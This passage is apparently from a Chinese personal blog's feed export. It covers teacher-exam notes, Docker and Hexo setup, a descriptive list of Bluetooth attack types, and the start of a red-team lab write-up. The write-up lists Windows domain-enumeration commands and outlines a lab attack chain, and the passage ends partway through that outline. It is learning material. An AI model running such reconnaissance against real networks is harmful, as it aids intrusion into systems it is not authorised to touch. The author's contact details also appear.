title="考试时间安排"></a>考试时间安排</h2><p><strong>时间安排大致如下</strong></p><table><thead><tr><th>时间</th><th>事件</th></tr></thead><tbody><tr><td>1月14日</td><td>2021上半年笔试报名</td></tr><tr><td>3月3日</td><td>2020下半年面试成绩查询</td></tr><tr><td>3月13日</td><td>2021上半年笔试考试</td></tr><tr><td>4月15日</td><td>2021上半年笔试查询2021上半年面试报名</td></tr><tr><td>5月15-16日</td><td>2021上半年面试考试</td></tr><tr><td>6月12日</td><td>2021上半年面试成绩查询</td></tr><tr><td><strong>时间</strong></td><td><strong>事件</strong></td></tr><tr><td>9月3日</td><td>2021下半年笔试报名</td></tr><tr><td>10月30日</td><td>2021下半年笔试考试</td></tr><tr><td>12月10日</td><td>2021下半年笔试成绩查询2021下半年面试报名</td></tr><tr><td>2022年1月8-9日</td><td>2021下半年面试考试</td></tr><tr><td>1月14日</td><td>2022上半年笔试报名</td></tr><tr><td>3月3日</td><td>2021下半年面试成绩查询</td></tr></tbody></table><h3 id="细分时间安排"><a href="#细分时间安排" class="headerlink" title="细分时间安排"></a>细分时间安排</h3><p>笔试 <strong>各科目考试时间为120分钟</strong>。</p><p>面试 <strong>考试时间为20分钟</strong>。</p><h1 id="考试内容总结"><a href="#考试内容总结" class="headerlink" title="考试内容总结"></a>考试内容总结</h1><p><strong>1、教师资格证考试有哪些学段和学科</strong></p><p>教师资格证考试包括<strong>幼儿园、小学、中学，</strong>其中<strong>中学又分为初中、高中及中职，</strong>下边我来挨个说说各学段包含的学科：</p><p>这里只总结高中的相关的学科</p><p><strong>高中：</strong>包括17个学科，分别为语文、数学、英语、物理、化学、生物、思想品德、历史、地理、体育与健康、音乐、美术、信息技术、通用技术、心理健康教育、日语、俄语；</p><p><strong>注意：</strong>我们教师资格证的考试对于考生的专业是不作要求的，比如你是学音乐的，但你照样可以选择报考体育学科。<strong>但是，在这里建议各位考生，尽量还是选一个和你专业相近的科目去报考，因为许多地区在进行教师招聘时，都会要求考生的报考科目与所学专业一致或相近</strong>。</p><p><img src="/2021/07/14/%E6%95%99%E5%B8%88%E8%B5%84%E6%A0%BC%E8%AF%81%E8%80%83%E8%AF%95%E6%80%BB%E7%BB%93//v2-5289f18b3406de812ec7c102c62a946b_r.jpg" alt="教师资格证笔试科目"></p><p><img src="/2021/07/14/%E6%95%99%E5%B8%88%E8%B5%84%E6%A0%BC%E8%AF%81%E8%80%83%E8%AF%95%E6%80%BB%E7%BB%93//v2-44827c601dad868e49eb37e5b33fb34e_720w.jpg" alt="中学除科目三的考试内容"></p><p>关于考试的试题，这里就没什么好总结的了，因为考试的话根据我的经验，<strong>最好的了解与提升方式就是看往年的真题</strong>，明天想办法拿到真题再说吧。</p><p><a href="%E6%95%99%E5%B8%88%E8%B5%84%E6%A0%BC%E8%AF%81%E8%80%83%E8%AF%95%E6%80%BB%E7%BB%93/2020%E4%B8%8B%E5%8D%8A%E5%B9%B4%E6%95%99%E5%B8%88%E8%B5%84%E6%A0%BC%E8%80%83%E8%AF%95%E4%B8%AD%E5%AD%A6%E3%80%8A%E7%BB%BC%E5%90%88%E7%B4%A0%E8%B4%A8%E3%80%8B%E8%AF%95%E9%A2%98_%E5%A4%A9%E6%B4%A5%E4%B8%AD%E5%85%AC%E6%95%99%E8%82%B2.pdf">《综合素质》真题pdf版，点击下载</a>。想要答案的请加我qq，[ :萌: ] 2994016494。</p><p><a href="https://wenku.baidu.com/view/60fc3ddf4b7302768e9951e79b89680203d86b8c.html">《教育知识与能力》真题链接</a></p><p>个人感觉大部分选择题都是些常识性的题目，这两门是同意都要考得，涵盖的是教育学与心理学相关的知识，需要资料较为统一。</p><p>然后就是<strong>《学科知识与教学能力》了</strong>，如果前面的两门相当于高考时的<strong>语数外</strong>的话，这一门分的就是文综与理综了，考的知识点专精，例如<strong>英语学科与教学能力</strong>的往年的试题如下</p><p><a href="https://www.233.com/teacher/zxzzt/201806/28090801272.html">英语学科往年试题</a></p><p>之后就是个把月之后还有的面试了，面试相关的知识较为简单，那个等对教师资格证的考试体制有了更深一步的了解之后会再去总结，面试的话主要就是备课、上课、面试几大步吧应该。。。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 教师资格证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>运维经验贴</title>
      <link href="/2021/07/10/%E8%BF%90%E7%BB%B4%E7%BB%8F%E9%AA%8C%E8%B4%B4/"/>
      <url>/2021/07/10/%E8%BF%90%E7%BB%B4%E7%BB%8F%E9%AA%8C%E8%B4%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="Centos运维经验"><a href="#Centos运维经验" class="headerlink" title="Centos运维经验"></a>Centos运维经验</h1><h2 id="docker相关的经验"><a href="#docker相关的经验" class="headerlink" title="docker相关的经验"></a>docker相关的经验</h2><h3 id="直接对docker的操作"><a href="#直接对docker的操作" class="headerlink" title="直接对docker的操作"></a>直接对docker的操作</h3><h4 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y yum-utils  device-mapper-persistent-data  lvm2</span><br><span class="line">yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line">dnf install https://mirrors.aliyun.com/docker-ce/linux/centos/7/x86_64/stable/Packages/containerd.io-1.2.13-3.1.el7.x86_64.rpm</span><br><span class="line">dnf install docker-ce</span><br><span class="line">sudo yum install docker-ce docker-ce-cli</span><br><span class="line">sudo systemctl start docker</span><br><span class="line">docker --version</span><br></pre></td></tr></table></figure><h4 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure><h4 id="更换源"><a href="#更换源" class="headerlink" title="更换源"></a>更换源</h4><blockquote><ul><li><p>docker中国官方</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://registry.docker-cn.com</span><br></pre></td></tr></table></figure></li><li><p>网易</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hub-mirror.c.163.com</span><br></pre></td></tr></table></figure></li><li><p>USTC</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://docker.mirrors.ustc.edu.cn</span><br></pre></td></tr></table></figure></li><li><p>阿里云　　</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://&lt;你的ID&gt;.mirror.aliyuncs.com</span><br></pre></td></tr></table></figure></li></ul></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">换源的方法是编辑/etc/docker/daemon.json（如果不存在则创建）:</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;registry-mirrors&quot;</span>:[</span><br><span class="line">         <span class="string">&quot;http://docker.mirrors.ustc.edu.cn&quot;</span>,</span><br><span class="line">         <span class="string">&quot;http://hub-mirror.c.163.com&quot;</span>,</span><br><span class="line">         <span class="string">&quot;http://registry.docker-cn.com&quot;</span></span><br><span class="line">    ] ,</span><br><span class="line">    <span class="string">&quot;insecure-registries&quot;</span>:[</span><br><span class="line">       <span class="string">&quot;docker.mirrors.ustc.edu.cn&quot;</span>,</span><br><span class="line">         <span class="string">&quot;registry.docker-cn.com&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="重启docker"><a href="#重启docker" class="headerlink" title="重启docker"></a>重启docker</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><h4 id="开启docker"><a href="#开启docker" class="headerlink" title="开启docker"></a>开启docker</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker   <span class="comment"># 一般开启docker</span></span><br></pre></td></tr></table></figure><h3 id="对docker容器的操作"><a href="#对docker容器的操作" class="headerlink" title="对docker容器的操作"></a>对docker容器的操作</h3><h4 id="复制文件到docker容器"><a href="#复制文件到docker容器" class="headerlink" title="复制文件到docker容器"></a>复制文件到docker容器</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker <span class="built_in">cp</span> 源vps绝对路径 容器ID:容器内的目标绝对路径</span><br></pre></td></tr></table></figure><h3 id="安装CTFd"><a href="#安装CTFd" class="headerlink" title="安装CTFd"></a>安装CTFd</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run --name ctfd -d -p 80:8000 ctfd/ctfd</span><br></pre></td></tr></table></figure><h3 id="查看端口占用进程"><a href="#查看端口占用进程" class="headerlink" title="查看端口占用进程"></a>查看端口占用进程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo lsof -i: 端口</span><br></pre></td></tr></table></figure><h1 id="常用小工具"><a href="#常用小工具" class="headerlink" title="常用小工具"></a>常用小工具</h1><h2 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h2><h3 id="解决hexo环境变量失效的问题"><a href="#解决hexo环境变量失效的问题" class="headerlink" title="解决hexo环境变量失效的问题"></a>解决hexo环境变量失效的问题</h3><p>hexo的环境变量应为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\AppData\Roaming\npm\node_modules\hexo-cli\bin</span><br></pre></td></tr></table></figure><p><img src="/2021/07/10/%E8%BF%90%E7%BB%B4%E7%BB%8F%E9%AA%8C%E8%B4%B4//image-20210812223221216.png"></p><h1 id="Deepin使用经验"><a href="#Deepin使用经验" class="headerlink" title="Deepin使用经验"></a>Deepin使用经验</h1><h2 id="1-在Deepin上重新配置Hexo环境"><a href="#1-在Deepin上重新配置Hexo环境" class="headerlink" title="1.在Deepin上重新配置Hexo环境"></a>1.在Deepin上重新配置Hexo环境</h2><h3 id="安装node-和-npm"><a href="#安装node-和-npm" class="headerlink" title="安装node 和 npm"></a>安装node 和 npm</h3><p><strong>npm</strong></p><h4 id="下面是失败案例，请自动跳过"><a href="#下面是失败案例，请自动跳过" class="headerlink" title="下面是失败案例，请自动跳过"></a>下面是失败案例，请自动跳过</h4><p>这个我看着太复杂了，就没有采用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><p>nodejs.cn中文网上面下载最新版的nodejs的linux版本，随后安装</p><p><img src="/2021/07/10/%E8%BF%90%E7%BB%B4%E7%BB%8F%E9%AA%8C%E8%B4%B4//image-20211224225952318.png" alt="image-20211224225952318"></p><h4 id="成功案例"><a href="#成功案例" class="headerlink" title="成功案例"></a>成功案例</h4><blockquote><p><a href="https://www.cnblogs.com/cuihuale-fe/p/15354818.html">https://www.cnblogs.com/cuihuale-fe/p/15354818.html</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// 安装 nodejs</span><br><span class="line">sudo apt-get install nodejs</span><br><span class="line"></span><br><span class="line">// 安装 npm</span><br><span class="line">sudo apt-get install npm</span><br><span class="line"></span><br><span class="line">// node 版本</span><br><span class="line">node -v</span><br><span class="line">10.8.2</span><br></pre></td></tr></table></figure><p>升级node版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// n 模块是管理 nodejs 版本的</span><br><span class="line">sudo npm install n -g</span><br><span class="line"></span><br><span class="line">// 1. 安装稳定版 nodejs</span><br><span class="line">sudo n stable </span><br><span class="line"></span><br><span class="line">// nodejs 版本</span><br><span class="line">node -v</span><br><span class="line">14.17.6</span><br><span class="line"></span><br><span class="line">// 2. 安装最新版 nodejs</span><br><span class="line">sudo n latest</span><br><span class="line"></span><br><span class="line">// nodejs 版本</span><br><span class="line">node -v </span><br><span class="line">16.10.0</span><br></pre></td></tr></table></figure><p>我直接下载最新版的node了哈哈。但是中间会有一个问题，就是从nodejs.org下载的时候，速度真的是太慢了，所以这里其实是可以改一下这个版本管理工具<code>n</code>的一些配置的。</p><p><img src="/2021/07/10/%E8%BF%90%E7%BB%B4%E7%BB%8F%E9%AA%8C%E8%B4%B4//image-20211225002021826.png" alt="image-20211225002021826"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">N_NODE_MIRROR=$&#123;N_NODE_MIRROR:-$&#123;NODE_MIRROR:-https://nodejs.org/dist&#125;&#125; 改成</span><br><span class="line">N_NODE_MIRROR=$&#123;N_NODE_MIRROR:-$&#123;NODE_MIRROR:-https://npm.taobao.org/mirrors/node&#125;&#125;</span><br></pre></td></tr></table></figure><p>速度马上就上去了</p><p><img src="/2021/07/10/%E8%BF%90%E7%BB%B4%E7%BB%8F%E9%AA%8C%E8%B4%B4//image-20211225002252479.png" alt="image-20211225002252479"></p><h3 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo npm install -g hexo-cli</span><br></pre></td></tr></table></figure><h3 id="配置hexo"><a href="#配置hexo" class="headerlink" title="配置hexo"></a>配置hexo</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">#之后添加公钥文件id_rsa.pub的内容到github的setting的key中即可</span><br><span class="line"></span><br><span class="line">git config --global user.email &quot;2994016494@qq.com&quot;</span><br><span class="line">git config --global user.name &quot;m4xlmum&quot;</span><br></pre></td></tr></table></figure><p>这就把这个hexo的环境配好了，更新云端文件只需要使用命令<code>hexo clean &amp;&amp; hexo g -d</code>即可。</p><p><img src="/2021/07/10/%E8%BF%90%E7%BB%B4%E7%BB%8F%E9%AA%8C%E8%B4%B4//image-20211225004054949.png"></p><h3 id="GitPage配置域名解析"><a href="#GitPage配置域名解析" class="headerlink" title="GitPage配置域名解析"></a>GitPage配置域名解析</h3><p>这个可以做做，整个CNAME的域名解析应该可以。</p><p><strong>先整个CNAME的插件</strong></p><p><a href="https://github.com/leecrossley/hexo-generator-cname">https://github.com/leecrossley/hexo-generator-cname</a></p><p><strong>然后在该页面添加你的域名，如<code>blog.shuqingshi.top</code></strong></p><p><img src="/2021/07/10/%E8%BF%90%E7%BB%B4%E7%BB%8F%E9%AA%8C%E8%B4%B4//image-20211224224904919.png" alt="image-20211224224904919"></p><p>最后阿里云的域名解析界面再加上一个CNAME记录即可成功解析。</p><p><img src="/2021/07/10/%E8%BF%90%E7%BB%B4%E7%BB%8F%E9%AA%8C%E8%B4%B4//image-20211224225445294.png" alt="image-20211224225445294"></p><p>还不错。</p><p><img src="/2021/07/10/%E8%BF%90%E7%BB%B4%E7%BB%8F%E9%AA%8C%E8%B4%B4//image-20211224225523742.png" alt="image-20211224225523742"></p><p><strong>如有问题，请看这里。</strong></p><p><img src="/2021/07/10/%E8%BF%90%E7%BB%B4%E7%BB%8F%E9%AA%8C%E8%B4%B4//image-20211225005620399.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 经验 </tag>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线安全</title>
      <link href="/2021/06/10/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"/>
      <url>/2021/06/10/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="蓝牙攻击"><a href="#蓝牙攻击" class="headerlink" title="蓝牙攻击"></a>蓝牙攻击</h1><h2 id="蓝牙是什么"><a href="#蓝牙是什么" class="headerlink" title="蓝牙是什么?"></a>蓝牙是什么?</h2><blockquote><p>在当前的网络应用中，物联网具有对物品多样性、低成本、低速率、短距离等特征的泛在需求，这类需求主要通过蓝牙等低速网络协议实现。蓝牙是一种短距离通信开放标准，利用嵌入式芯片实现通讯距离在10m～100m之间的无线连接。蓝牙的设计目标在于通过统一的近距离无线连接标准使各生产商生产的个人设备都能通过该网络协议更方便地实现低速率数据传输和交叉操作。蓝牙技术具有低成本、低功耗、模块体积小、易于集成等特点，非常适合在新型物联网移动设备中应用。</p></blockquote><h2 id="几种攻击方式"><a href="#几种攻击方式" class="headerlink" title="几种攻击方式"></a>几种攻击方式</h2><p>引用自此、<a href="https://www.chomptech.com/3843.html">https://www.chomptech.com/3843.html</a></p><blockquote><p><strong>针对蓝牙的攻击威胁大体上可以分为两种，一种是对不同无线网络均适用的攻击，—种是针对蓝牙特定的攻击。</strong></p><p>3.1拒绝服务攻击：拒绝服务攻击(DOS)的原理是在短时间内连续向被攻击目标发送连接请求，使被攻击目标无法与其他设备正常建立连接。蓝牙的逻辑链路控制和适配协议规定了蓝牙设备的更高层协议可以接收和发送64KB的数据包，类似于ping数据包，针对这个特点，攻击者可以发送大量ping数据包占用蓝牙接口，使蓝牙接口不能正常使用，并目一直使蓝牙处于高频工作状态从而耗尽设备电池。DoS攻击流程图如图4所示。</p><p>3.2中间人攻击：在两个设备之间的攻击者截获数据一方发送的数据后再转发给另一方，可在不影响双方通信的情况下获得双方通信的内容，是一种广泛应用于无线网络的攻击方式。蓝牙4.0版本的低功耗蓝牙技术(BluetoothLowEnergy，BLE)在设计初始时有防范中间人攻击的安全措施，但是在产品阶段考虑到产品功耗成本等因素，这方面并没有得到足够的重视，依然容易受到攻击。最常见的是用软硬件结合的蓝牙攻击设备伪造BLE通信进行中间人攻击。中间人攻击示意图如图5所示。</p><p>3.3漏洞窃听：蓝牙窃听可以通过对蓝牙漏洞的攻击来实现，蓝牙中的OBEX(ObjectExchange)协议，即对象交换协议在早期的蓝牙产品规范中没有强制要求使用权鉴，所以攻击者可以利用此漏洞在被攻击者手机没有提示的情况下链接到被攻击手机，获取对手机内各种多媒体文件以及短信通话记录等文件的增删改权限，甚至可以通过手机命令拨打接听电话。具有这些攻击功能的指令代码被黑客写成了手机软件，可在网络上下载。普通人_般会使用图形化界面去操作，某些山寨手机中甚至自带这项功能，当和别的手机配对成功后即可获得对方手机的操作权限。不过随着蓝牙技术的不断提升，针对早期蓝牙漏洞的攻击现在已经越来越少见。</p><p>3.4重放攻击：重放攻击的原理是监听或者伪造双方通信的认证凭证，经过处理后再回发给被攻击方进行认证。蓝牙传输过程中有79个信道，攻击者可以通过监听信道、计算跳频时序、回放已授权设备的IZI令来进行攻击。V4.2的标准中已经增加了防止重放攻击的协议。</p><p>3.5配对窃听：蓝牙V2.0及之前更早版本默认的4位PIN码很容易被暴力破解，因为低位数字排列组合的方式十分有限，蓝牙V4.0的LE配对同理。攻击者只要监听到足够的数据帧，就可以通过暴力破解等方式确定密钥，模拟通信方，实现攻击目的。</p><p>3.6位置攻击：每个蓝牙设备都有唯一的6字节序列号作为设备地址，这种序列标识由于在使用过程中不发生改变很容易泄露设备的位置信息。攻击者可以根据蓝牙的调频连接机制和寻呼机制、设备标识符和其他通信参数获得被攻击者设备的地理位置。</p><p>3.7简单配对模式攻击：蓝牙V2.0规定的SSP安全简单配对连接方式并不安全，是由于使用了静态口令而无法防止中间人攻击，并且一旦攻击者取得了口令，在一段时间内可以用此口令进行持续性攻击。</p></blockquote><p>暂时因为linux虚拟机的问题解决不了而放弃。。。</p><h1 id="WIFI攻击"><a href="#WIFI攻击" class="headerlink" title="WIFI攻击"></a>WIFI攻击</h1><h2 id="什么是WIFI"><a href="#什么是WIFI" class="headerlink" title="什么是WIFI"></a>什么是WIFI</h2><blockquote><p>​无线网络上网可以简单的理解为无线上网，几乎所有<a href="https://baike.baidu.com/item/%E6%99%BA%E8%83%BD%E6%89%8B%E6%9C%BA">智能手机</a>、<a href="https://baike.baidu.com/item/%E5%B9%B3%E6%9D%BF%E7%94%B5%E8%84%91">平板电脑</a>和笔记本电脑都支持Wi-Fi上网，是当今使用最广的一种无线网络传输技术。实际上就是把有线网络信号转换成无线信号，就如在开头为大家介绍的一样，使用无线路由器供支持其技术的相关电脑，<a href="https://baike.baidu.com/item/%E6%89%8B%E6%9C%BA/6342">手机</a>，平板等接收。手机如果有Wi-Fi功能的话，在有Wi-Fi无线信号的时候就可以不通过移动联通的网络上网，省掉了流量费。</p><p>​无线网络无线上网在大城市比较常用，虽然由Wi-Fi技术传输的无线通信质量不是很好，数据安全性能比蓝牙差一些，传输质量也有待改进，但传输速度非常快，可以达到54Mbps，符合个人和社会信息化的需求。Wi-Fi最主要的优势在于不需要布线，可以不受布线条件的限制，因此非常适合移动办公用户的需要，并且由于发射信号功率低于100mw，低于手机发射功率，所以Wi-Fi上网相对也是最安全健康的。</p><p>​但是Wi-Fi信号也是由有线网提供的，比如家里的<a href="https://baike.baidu.com/item/ADSL">ADSL</a>，小区宽带等，只要接一个<a href="https://baike.baidu.com/item/%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8">无线路由器</a>，就可以把有线信号转换成Wi-Fi信号。国外很多发达国家城市里到处覆盖着由政府或大公司提供的Wi-Fi信号供居民使用，我国也有许多地方实施”<a href="https://baike.baidu.com/item/%E6%97%A0%E7%BA%BF%E5%9F%8E%E5%B8%82">无线城市</a>“工程使这项技术得到推广。在4G牌照没有发放的试点城市，许多地方使用4G转Wi-Fi让市民试用。(现在已经5G了，也就是说百度百科的某些信息都已经过时了)</p></blockquote><h2 id="ESP8266实现WIFI-Killer"><a href="#ESP8266实现WIFI-Killer" class="headerlink" title="ESP8266实现WIFI Killer"></a>ESP8266实现WIFI Killer</h2><p>​在4G wifi网的情况下，我们是可以使用自制的开发板来实现无线wifi攻击的，这里我特意上某多买了一个esp 8266开发板，emmm，具体型号应该是叫<code>NodeMCU</code></p><p>​看看下面的<a href="https://wiki.diustou.com/cn/NodeMCU">百科</a>，大概了解一下esp8266开发板</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>WEB靶场复现总刊</title>
      <link href="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/"/>
      <url>/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><h2 id="域渗透的基础知识"><a href="#域渗透的基础知识" class="headerlink" title="域渗透的基础知识"></a>域渗透的基础知识</h2><p><a href="https://www.freebuf.com/company-information/172630.html">干货！内网渗透测试之域渗透详解！收藏！</a></p><p><a href="http://www.91ri.org/10154.html">内网渗透之-域渗透基础</a></p><p>希望今天可以简单学习一下域渗透的基础知识，为明天的域渗透实战做好准备——2021年6月4日</p><h3 id="域渗透场景"><a href="#域渗透场景" class="headerlink" title="域渗透场景"></a>域渗透场景</h3><p>场景一：某处于域中的服务器通过路由做端口映射，对外提供web服务，我们通过web脚本漏洞获得了该主机的system权限，如果甲方有进一步的内网渗透测试需求，以证明企业所面临的巨大风险，这个时候就需要做内网的域渗透。</p><p>……</p><p>域渗透看起来就像是所获成果的效益最大化，拿到system权限之后，再用该拿到权限的主机作为跳板打通内网</p><h3 id="什么是域"><a href="#什么是域" class="headerlink" title="什么是域"></a>什么是域</h3><p>将网络中多台计算机逻辑上组织到一起，进行集中管理，这种区别于工作组的逻辑环境叫做域，域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库。</p><p><strong>&lt;域控制器、域成员、web服务器&gt;</strong></p><p>域成员计算机在登录的时候可以选择登录到域中或此计算机，登陆到域中的时候，身份验证是采用Kerberos协议在域控制器上进行的，登陆到此计算机则是通过SAM来进行NTLM验证的</p><h3 id="域渗透常用命令"><a href="#域渗透常用命令" class="headerlink" title="域渗透常用命令"></a>域渗透常用命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net time /domain        #查看时间服务器</span><br><span class="line">net user /domain        #查看域用户</span><br><span class="line">net view /domain        #查看有几个域</span><br><span class="line">net group &quot;domain computers&quot; /domain         #查看域内所有的主机名</span><br><span class="line">net group &quot;domain admins&quot;   /domain          #查看域管理员</span><br><span class="line">net group &quot;domain controllers&quot; /domain       #查看域控</span><br></pre></td></tr></table></figure><h2 id="红日安全靶场-lt-01-ATT-amp-CK红队评估-gt"><a href="#红日安全靶场-lt-01-ATT-amp-CK红队评估-gt" class="headerlink" title="红日安全靶场&lt;01 ATT&amp;CK红队评估&gt;"></a>红日安全靶场&lt;01 ATT&amp;CK红队评估&gt;</h2><h3 id="零、靶场介绍与下载"><a href="#零、靶场介绍与下载" class="headerlink" title="零、靶场介绍与下载"></a>零、靶场介绍与下载</h3><h4 id="0-靶场下载地址"><a href="#0-靶场下载地址" class="headerlink" title="0.靶场下载地址"></a>0.靶场下载地址</h4><p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">靶场下载地址</a></p><p><strong>靶场介绍</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。另外本次实战完全模拟ATT&amp;CK攻击链路进行搭建，开成完整闭环。后续也会搭建真实APT实战环境，从实战中成长。关于环境可以模拟出各种各样实战路线，目前给出作者实战的一套攻击实战路线如下，虚拟机所有统一密码：hongrisec@2019：</span><br><span class="line"></span><br><span class="line">一、环境搭建</span><br><span class="line">1.环境搭建测试</span><br><span class="line">2.信息收集</span><br><span class="line"></span><br><span class="line">二、漏洞利用</span><br><span class="line">3.漏洞搜索与利用</span><br><span class="line">4.后台Getshell上传技巧</span><br><span class="line">5.系统信息收集</span><br><span class="line">6.主机密码收集</span><br><span class="line"></span><br><span class="line">三、内网搜集</span><br><span class="line">7.内网--继续信息收集</span><br><span class="line">8.内网攻击姿势--信息泄露</span><br><span class="line">9.内网攻击姿势-MS08-067 </span><br><span class="line">10.内网攻击姿势-SMB远程桌面口令猜测</span><br><span class="line">11.内网攻击姿势-Oracle数据库TNS服务漏洞</span><br><span class="line">12.内网攻击姿势-RPC DCOM服务漏洞</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">四、横向移动</span><br><span class="line">13.内网其它主机端口-文件读取</span><br><span class="line">14.内网其它主机端口-redis</span><br><span class="line">15.内网其它主机端口-redis Getshell</span><br><span class="line">16.内网其它主机端口-MySQL数据库</span><br><span class="line">17.内网其它主机端口-MySQL提权</span><br><span class="line"></span><br><span class="line">五、构建通道</span><br><span class="line">18.内网其它主机端口-代理转发</span><br><span class="line"></span><br><span class="line">六、持久控制</span><br><span class="line">19.域渗透-域成员信息收集</span><br><span class="line">20.域渗透-基础服务弱口令探测及深度利用之powershell</span><br><span class="line">21.域渗透-横向移动[wmi利用]</span><br><span class="line">22.域渗透-C2命令执行</span><br><span 